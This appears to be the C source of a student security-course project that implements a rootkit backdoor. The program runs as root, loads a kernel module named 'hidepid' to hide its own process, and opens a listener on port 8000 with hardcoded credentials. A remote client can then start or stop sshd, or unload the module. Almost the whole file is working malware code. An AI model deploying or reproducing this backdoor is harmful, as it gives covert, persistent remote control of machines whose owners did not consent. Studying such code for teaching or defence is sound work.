/*------------------------------------------------------------------------------

    1. Projekt na BIS

    Autor: Radovan Dvorsky, xdvors08

------------------------------------------------------------------------------*/
#define _POSIX_C_SOURCE 199506L

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <assert.h>
#include <signal.h>
#include <fcntl.h>


#define ROOTKIT_MODULE_SYS_PATH "/sys/module/hidepid/"
#define MODULE_NAME "hidepid"

#define SERVER_PORT 8000
#define BUFFER_SIZE 256
#define CMD_SIZE_COUNT 10
#define BACKLOG_QUEUE 5
#define AUTH_LOGIN "client"
#define AUTH_PASSWD "password"


#define LOGIN_FAILED_MSG "Login failed: "
#define HELLO_MSG "-----------------------\n\tWelcome!\n-----------------------\n\n"
#define COMMANDS_HELP "prikazy:\nsshd [start|stop] - spusti/zastavi ssh server\nexit\t\t  - uzatvori spojenie\ndestroy\t\t  - ukonci na strane servera a vrati system do povodneho stavu\n\n"
#define SSHD_NOT_FOUND "sshd server not found\n"
#define SSH_INIT_PATH "/etc/init.d/sshd"
#define SSH_BIN_PATH "/usr/sbin/sshd"
#define PS_PATH "/bin/ps"
#define BACKUP_PS_PATH "/bin/.ps.old"
#define COMPILED_PS_PATH "./procps/ps/ps"

#ifndef BUFSIZ
#define BUFSIZ 8192
#endif

pthread_t thread;
int sockfd, newsockfd;
pid_t app_pid;
struct sockaddr_in server_addr;

void sigint_handle(int);
void *handle_client(void*);
int auth_user(int,char[]);
void write_msg(int, char[]);
int read_cmd(int,char[]);
int file_exists(const char*);
void call_cmd(char *cmds[BUFFER_SIZE],int);
void init_hide_binary();
void clean_hide_binary();
void copy_file(int source, int dest);

void sigint_handle(int sig){
	clean_hide_binary();
}

int main(void){
	
	/* kontrola ci je root */
	if(getuid() != 0){		
		printf("Program must be run as root\n");
		return 1;
	}

	app_pid = getpid();
	init_hide_binary();
	
#ifdef DEBUG
	printf("Application pid: %d\n",getpid());
#endif

	/* nastavenie signalu na ukoncenie aplikacie pomocou ctrl+c */
	struct sigaction sigint;
	sigset_t sigint_set;
	sigemptyset(&sigint_set);
	sigaddset(&sigint_set,SIGINT);
	sigint.sa_handler = sigint_handle;

	if(sigaction(SIGINT,&sigint,NULL)){
		perror("sigaction()");
		return 1;
	}

	struct sockaddr_in client_addr;
	pthread_attr_t attr;
	int res, client_len, yes = 1;
	

	/* inicializacia atributov pre vlakno */
	if((res = pthread_attr_init(&attr)) != 0){
		printf("pthread_attr_init() error %d\n",res);
		return 1;
	}

	/* nesakaj na join */
	if((res = pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED)) != 0){
		printf("pthread_attr_setdetachstate() error %d\n",res);
		return 1;
	}

	/* Vytvorenie socketu */
	if((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0){
		perror("Opening socket");
		exit(1);
	}

	/* po restarte umozni znovu bind*/
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) == -1) {
		perror("setsockopt");
		exit(1);
	}

	/* Inicializacia addries socketu */
	memset(&server_addr,0,sizeof(server_addr));
	/*bzero((char *) &server_addr,sizeof(server_addr));*/
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(SERVER_PORT);


	if(bind(sockfd,(struct sockaddr *  ) &server_addr, sizeof(server_addr)) < 0){
		perror("Server binding");
		exit(1);
	}


	/* pocuvaj na danom sockete */
	if(listen(sockfd,BACKLOG_QUEUE) != 0){
		perror("listen");
		exit(1);
	}

	client_len = sizeof(client_addr);

	while(1){

		/* cakaj az kym sa niekdo nepripoji */
		newsockfd = accept(sockfd, (struct sockaddr *) &client_addr, (socklen_t*)&client_len);

		if(newsockfd < 0){
			perror("Server accept");
			exit(1);
		}

#ifdef DEBUG
		printf("Client connected from %s:%i\n",
				inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
#endif
		if(pthread_create(&thread,&attr,handle_client,(void *)&newsockfd)){
			perror("pthread_create");
			exit(1);
		}
	}


	/* atributy uz netreba */
	if((res = pthread_attr_destroy(&attr)) != 0){
		printf("pthread_attr_destroy() error %d\n",res);
		return 1;
	}


	return 0;
}

void *handle_client(void* param){

	int *client_socket_addr = (int*)param;
	int client_socket = *client_socket_addr;
	int logged = 0;

	char buffer[BUFFER_SIZE];


#ifdef DEBUG
	printf("Client socket id: %d\n",client_socket);
#endif

	int quit_client = 0;

	while(1){

		if(quit_client) break;

		/* nastavenie bufferu */
		memset(buffer,0,BUFFER_SIZE);
		/*bzero(buffer,BUFFER_SIZE);*/

		/* auth. klienta */
		if(!logged){
			if((logged = auth_user(client_socket,buffer)) == 0){
				break;
			}
		}

		if(read_cmd(client_socket,buffer) == 1){
			close(client_socket);
			quit_client = 1;
		}
	}


	return (void *)1;
}

int auth_user(int client_socket,char buffer[]){

	int n;
	int auth_login = 0;
	int auth_passwd = 0;

	write_msg(client_socket,"Login: ");
	if((n = read(client_socket,buffer,BUFFER_SIZE)) < 0){
		perror("Reading from socket");
		exit(1);
	}

	buffer[strlen(AUTH_LOGIN)] = '\0';
	if(strcmp(buffer,AUTH_LOGIN) == 0) auth_login = 1;


	/*bzero(buffer,BUFFER_SIZE);*/
	memset(buffer,0,BUFFER_SIZE);
	
	write_msg(client_socket,"Password: ");
	if((n = read(client_socket,buffer,BUFFER_SIZE)) < 0){
		perror("Reading from socket");
		exit(1);
	}

	buffer[strlen(AUTH_PASSWD)] = '\0';
	if(strcmp(buffer,AUTH_PASSWD) == 0) auth_passwd = 1;

	/*bzero(buffer,BUFFER_SIZE);*/
	memset(buffer,0,BUFFER_SIZE);

#ifdef DEBUG
	printf("login: %d\npasswd: %d\n",auth_login,auth_passwd);
#endif


	if(!auth_login || !auth_passwd){
		write_msg(client_socket,LOGIN_FAILED_MSG);
		close(client_socket);
#ifdef DEBUG
		printf("Client with id %d disconnected\n",client_socket);
#endif
		return 0;
	}else{
#ifdef DEBUG
		printf("Client with id %d auth\n",client_socket);
#endif
		write_msg(client_socket,HELLO_MSG);
		write_msg(client_socket,COMMANDS_HELP);
		return 1;
	}

}

void write_msg(int client_socket, char msg[]){

	if(write(client_socket,msg,strlen(msg)) == -1){
		perror("Socket writing");
	}
}

int read_cmd(int client_socket, char buffer[]){

	int n;

	write_msg(client_socket,"> ");
	if((n = read(client_socket,buffer,BUFFER_SIZE)) < 0){
		perror("Reading from socket");
		exit(1);
	}


	int i = 0;
    char *ret_token;        									  	/* naparsovany parameter */
    char *rest = (char *)malloc(sizeof(char)*BUFFER_SIZE);       	/* treba inicializovat inak warning */
    char *cmds[BUFFER_SIZE];

    /* prechadza cely retazec a vytvara pole prikazu a jeho parametrov */
    while((ret_token = strtok_r(buffer, " ", &rest)) != NULL){
        /* odstrani znak noveho riadku */
        if(ret_token[strlen(ret_token) - 1] == '\n'){
            ret_token[strlen(ret_token) - 1] = '\0';
        }

        cmds[i++] = ret_token;
        buffer = rest;
    }

	/* spracovanie prikazu */
    if(i > 3) {
		
		write_msg(client_socket,"Unsupported command\n");
		
    }else{
		/* odpoj klienta */
		if(strstr(cmds[0],"exit") != NULL) {
			return 1;
		}

		/* ukonci sever a odpoj klienta  */
		if(strstr(cmds[0],"destroy") != NULL) {
			clean_hide_binary();
			exit(0);
		}

		/* ostatne prikazy */
		call_cmd(cmds,client_socket);
    }

    return 0;

}

void call_cmd(char *cmds[BUFFER_SIZE], int client_socket){

	/* inicalizacia  */
	if(strstr(cmds[0],"init") != NULL) {
	    init_hide_binary();
	    write_msg(client_socket,"rootkit hidden\n");
	    return;
	}/* sshd server prikazy */
	else if(strcmp(cmds[0],"sshd") == 0){

		if(strstr(cmds[1],"start") != NULL){
			if(file_exists(SSH_BIN_PATH)){
				system(SSH_BIN_PATH);
			}else if(file_exists(SSH_INIT_PATH)){
				system("/etc/init.d/sshd start");
			}else{
				write_msg(client_socket,SSHD_NOT_FOUND);
				return;
			}

			write_msg(client_socket,"sshd started\n");
		}
		else if(strstr(cmds[1],"stop") != NULL){
			if(file_exists(SSH_BIN_PATH)){
				system("killall sshd");
			}else if(file_exists(SSH_INIT_PATH)){
				system("/etc/init.d/sshd stop");
			}else{
				write_msg(client_socket, SSHD_NOT_FOUND);
				return;
			}

			write_msg(client_socket,"sshd stoped\n");
		}
	}
}

int file_exists(const char *filename){

	FILE *fp;
	
	if ((fp = fopen(filename, "r"))){
        fclose(fp);
        return 1;
    }
    return 0;
}

void init_hide_binary(){
	
	char command_buff[200];
	
	/* ak existuje tak netreba inicializovat */
	if(file_exists(ROOTKIT_MODULE_SYS_PATH))
		return;
	
	sprintf(command_buff,"insmod ./%s.ko server_pid=\"%d\"",MODULE_NAME,(int)app_pid);

#ifdef DEBUG
	printf("hiding rootkit\n");
#endif
	system(command_buff);	
}

void clean_hide_binary(){
	
	char command_buff[200];
	
	/* ak neexistuje tak neodstranuj */
	if(!file_exists(ROOTKIT_MODULE_SYS_PATH))
		return;
	
#ifdef DEBUG
	printf("rootkit cleaning\n");
#endif
	
	sprintf(command_buff,"rmmod -f %s",MODULE_NAME);
	system(command_buff);
}
